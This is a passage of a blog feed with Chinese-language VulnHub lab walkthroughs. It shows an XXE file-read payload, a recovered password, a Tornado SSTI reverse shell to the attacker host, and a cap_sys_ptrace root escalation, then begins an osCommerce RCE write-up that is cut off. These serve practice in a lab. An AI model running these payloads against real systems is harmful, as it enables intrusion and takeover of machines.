&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-638.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 读取成功，并且找到了相关用户，如 saket，接下来尝试读取各种敏感文件。利用 php 为协议：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;完整的payload是&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY dd SYSTEM &amp;#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&amp;#x27;&amp;gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;name&amp;gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;tel&amp;gt;&amp;lt;/tel&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;amp;dd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;password&amp;gt;&amp;lt;/password&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-639.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;出现了一串 base64 加密的字符，利用 base -d 解密后发现是用户名和密码&lt;br&gt;
 &lt;code&gt;cat bashrc.txt| base64 -d&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-640.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; username=“admin” password=“Saket!#$%@!!”&lt;/p&gt;
&lt;h3 id=&#34;用户名喷洒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户名喷洒&#34;&gt;#&lt;/a&gt; 用户名喷洒&lt;/h3&gt;
&lt;p&gt;这是一个 ssh 登陆或者网站的后台密码，前面端口扫描时有个 9999 端口没有收集信息，我们进到这个页面看看这个 9999 端口是什么&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-641.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用破解出来的账户密码登陆时发现登陆失败&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-642.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过前面收集到的信息的总结，知道 /home 目录下有 saket 的用户，并且密码中也有 saket 的存在，尝试将用户名换为 saket 进行登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-643.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;—&amp;gt; 成功拿到后台权限&lt;/p&gt;
&lt;h3 id=&#34;ssti模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti模板注入&#34;&gt;#&lt;/a&gt; SSTI 模板注入&lt;/h3&gt;
&lt;p&gt;登陆后台成功，提示需要一个 name 的参数&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-644.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 /name=1 的参数输入，在页面上出现了回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-645.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来目标转向如何利用这个漏洞，用 nmap 扫描这个端口处是否存在框架&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-646.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描到的结果是 torando 框架&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-647.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现框架为 python 框架，既然是 py 的，就可以尝试一下 SSTI 模板注入&lt;br&gt;
关于 SSTI 模板注入，在 hacktrick 上有很详细的说明:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3NzdGktc2VydmVyLXNpZGUtdGVtcGxhdGUtaW5qZWN0aW9u&#34;&gt;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SSTI 模板注入:  &lt;code&gt;http://192.168.31.60:9999/?name=&amp;#123;&amp;#123; 2 * 2 &amp;#125;&amp;#125;&lt;/code&gt; &lt;br&gt;
 页面回显为计算结果 4 ，表示此处确实存在 SSTI 模板注入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-648.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;导入包 os，执行系统命令:&lt;br&gt;
 &lt;code&gt;http://192.168.31.60:9999/?name=&amp;#123;%%20import%20os%20%&amp;#125;&amp;#123;&amp;#123;os.system(%27id%)27)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-649.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;虽然当前没有回显出 id 命令执行后的结果，但是却也没有报错&lt;/p&gt;
&lt;h3 id=&#34;ssti-反弹绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-反弹绕过&#34;&gt;#&lt;/a&gt; SSTI 反弹绕过&lt;/h3&gt;
&lt;p&gt;尝试用此处的 SSTI 模板进行反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://192.168.31.60:9999/?name=&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4446 &gt;&amp;1&#34;&#39;)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-650.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹 shell 时报错，接下来用编码的方式绕过这种检查&lt;/p&gt;
&lt;p&gt;采用 url 编码的方式，在线地址为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=&#34;&gt;http://www.jsons.cn/urlencode&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;将 payload 进行编码后，拼接到原 url 后面，访问页面&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://192.168.31.11:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.135%2F4444%200%3E%261%22%27)%7D%7D&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-651.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;与此同时，监听对应的端口，等到 shell 的反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-652.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到 shell&lt;/p&gt;
&lt;h3 id=&#34;弹出标准-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#弹出标准-shell&#34;&gt;#&lt;/a&gt; 弹出标准 SHELL&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;美化得到的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo; fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SHELL是环境变量，它的值代表系统执行shell的文件位置。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;script 命令的原本作用是录制终端的会话过程，执行该命令后会运行一个新的shell，在此shell中执行命令的过程将会记录下来并保存在一个文件里面。这里执行 script 并不需要录制命令过程，我们需要的仅仅是它会运行一个新的shell。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-q 代表以静默方式运行一个新的shell，也就是说在后台运行一个新的shell。如果不加这个参数，则会弹出一个新的shell命令框。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/dev/null在这条命令中扮演的角色是保存script记录的文件，但是/dev/null一个特殊的设备文件，一切写入改文件的数据都会消失。我们不需要记录我们所执行的命令，所以将script所记录的内容指向该设备文件。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-653.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linpeas-提权信息扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linpeas-提权信息扫描&#34;&gt;#&lt;/a&gt; linpeas 提权信息扫描&lt;/h3&gt;
&lt;p&gt;尝试用 linux 提权工具提权，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1rYWxpbGlucGVhcy0zcDhxbTIwYjN4Ynp3OGFmN2dsNGI4eDNnLnNo&#34;&gt;提前在 kali 上准备好 linpeas.sh&lt;/span&gt; 并通过 py 开启简易 web&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-654.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在靶机上下载 linpeas.sh 并加可执行权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-655.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行并开始扫描./linpeas.sh&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-656.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了 python2.7 的权限设置错误&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-657.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;cap_sys_ptrace-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cap_sys_ptrace-提权&#34;&gt;#&lt;/a&gt; cap_sys_ptrace 提权&lt;/h3&gt;
&lt;p&gt;关于 cap_sys_ptrace 提权的教程：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LWhhcmRlbmluZy9wcml2aWxlZ2UtZXNjYWxhdGlvbi9saW51eC1jYXBhYmlsaXRpZXM=&#34;&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。&lt;/p&gt;
&lt;p&gt;这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。如果 Capabilities 设置不正确，就会让攻击者有机可乘，实现权限提升。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-658.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;保存 payload，并按 hacktrick 上的教程进行复现&lt;/p&gt;
&lt;p&gt;利用参考中的 exp.py 文件，传入参数为选择的进程 id, 执行成功后会在靶机的 5600 端口开一个绑定 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-659.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不一样的能力，每种能力表明必定的特权操做。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;setcap&lt;/span&gt;来设置权限，&lt;span class=&#34;built_in&#34;&gt;getcap&lt;/span&gt;来验证权限是否设置正确。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CAP_SYS_PTRACE允许使用ptrace( 2 )和最近引入的跨内存附加系统调用，如果授予此功能并且ptrace( 2 )系统调用本身没有被 seccomp 过滤器阻止，这将允许攻击者绕过其他 seccomp 限制。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getcap -r / 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/python2.7 = cap_sys_ptrace+ep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;循环，来依次注入每一个root进程号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in `ps -ef|grep root|grep -v &amp;quot;grep&amp;quot;|awk &amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27;`; do python2.7 exp.py $i; done&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-660.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注入成功后即可获取到root权限的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -an | grep 5600&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.31. 11 5600&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-661.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/122%20FUNBOX10/</guid>
            <title>VULNHUB 22 FUNBOX10</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/122%20FUNBOX10/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZnVuYm94LXVuZGVyLWNvbnN0cnVjdGlvbiw3MTUv&#34;&gt;https://www.vulnhub.com/entry/funbox-under-construction,715/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RpbWVzbGVlcC9hcnRpY2xlL2RldGFpbHMvMTI0MDA1NDM0&#34;&gt;https://blog.csdn.net/timesleep/article/details/124005434&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 FUNBOX10：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-503.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.133&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.133&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-504.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,25,80,110,133&lt;/p&gt;
&lt;p&gt;SMTP（简单邮件传输协议）是用于发送和接收电子邮件的 TCP/IP 协议。但是，由于它在接收端对消息进行排队的能力有限，因此它通常与其他两种协议（POP3 或 IMAP）中的一种一起使用，让用户将消息保存在服务器邮箱中并定期从服务器下载它们。&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMz&#34;&gt;http://192.168.31.133&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-505.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.133&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-506.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对扫描的网址进行挨个测试，发现到一个敏感网址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2c=&#34;&gt;http://192.168.31.133/catalog&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-507.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;oscommerce-漏洞寻找&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#oscommerce-漏洞寻找&#34;&gt;#&lt;/a&gt; oscommerce 漏洞寻找&lt;/h3&gt;
&lt;p&gt;靶机上存在 oscommerce，直接搜索是否存在相应的 exp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-508.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;默认进入的漏洞利用并不能直接权限提升，用更精确的搜寻来寻找在 exploit-db 上搜查 osCommerce 2.3.4 存在的漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-509.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 搜索到了一个 RCE 漏洞，此影响较大，可直接拿到 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-510.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;exploit-db-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exploit-db-使用&#34;&gt;#&lt;/a&gt; exploit-db 使用&lt;/h3&gt;
&lt;p&gt;获取漏洞利用代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQzNzQ=&#34;&gt;https://www.exploit-db.com/exploits/44374&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-511.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看该漏洞是如何利用的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-512.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;需要两个地址，一个是基础的路径，一个是目标路径&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=&#34;&gt; http://192.168.31.133/catalog/install/index.php&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=&#34;&gt;http://192.168.31.133/catalog/install/install.php?step=4&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;同时也可以从 searchsploit 获取到漏洞利用的代码&lt;br&gt;
 searchsploit osCommerce 2.3.4.1&lt;br&gt;
searchsploit -x php/webapps/44374.py&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-513.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 exp 利用方式的两个 url 地址是否能正常访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=&#34;&gt; http://192.168.31.133/catalog/install/index.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-514.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=&#34;&gt;http://192.168.31.133/catalog/install/install.php?step=4&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-515.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;oscommerce-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#oscommerce-漏洞利用&#34;&gt;#&lt;/a&gt; oscommerce 漏洞利用&lt;/h3&gt;
&lt;p&gt;从 searchsploit 中获取到的 exp 复制出来，进行修正&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-516.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;需要修改的有三个地方，两个 url 地址，以及要执行的命令&lt;br&gt;
 base_url=“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHAlRTIlODAlOUQ=&#34;&gt;http://192.168.31.133/catalog/install/index.php”&lt;/span&gt;&lt;br&gt;
